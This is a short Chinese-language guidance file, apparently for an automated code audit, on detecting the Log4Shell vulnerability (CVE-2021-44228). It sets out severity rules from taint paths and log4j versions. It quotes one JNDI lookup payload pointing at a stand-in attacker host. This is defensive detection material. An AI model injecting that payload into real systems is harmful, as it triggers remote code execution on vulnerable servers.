# Log4Shell (CVE-2021-44228) 判断知识

Log4j 2.x（< 2.15.0）解析日志中的 `${jndi:ldap://attacker.com/a}` 触发 RCE，CVSS 10.0。
- **受影响**：log4j-core 2.0-beta9 ~ 2.14.1
- **部分缓解**：2.15.0
- **完全修复**：2.17.1+

## 查询结果说明

| 文件 | 含义 |
|------|------|
| `log4j_taint.json` | 用户输入 → Logger 的污点路径 |
| `log4j_calls.json` | 所有日志调用点 |

## 判断规则

| 场景 | 严重度 |
|------|--------|
| 用户输入→Logger + 版本 2.0~2.14.1 | **CRITICAL** |
| 用户输入→Logger + 版本未知/2.15~2.16 | **HIGH** |
| 用户输入→Logger + 版本 ≥ 2.17.1 | **LOW**（已修复） |
| 无用户输入流向 Logger | 安全，不上报 |

首先检查 tech_profile 中的 log4j 版本。`log4j_taint` 为空但 `log4j_calls` 有结果时，检查参数是否含 HTTP 请求值。

`rule_id` 命名：`log4shell-taint`、`log4j-version-vulnerable`。

**build-mode=none 限制**：Sink 参数为非字面量表达式即可上报。
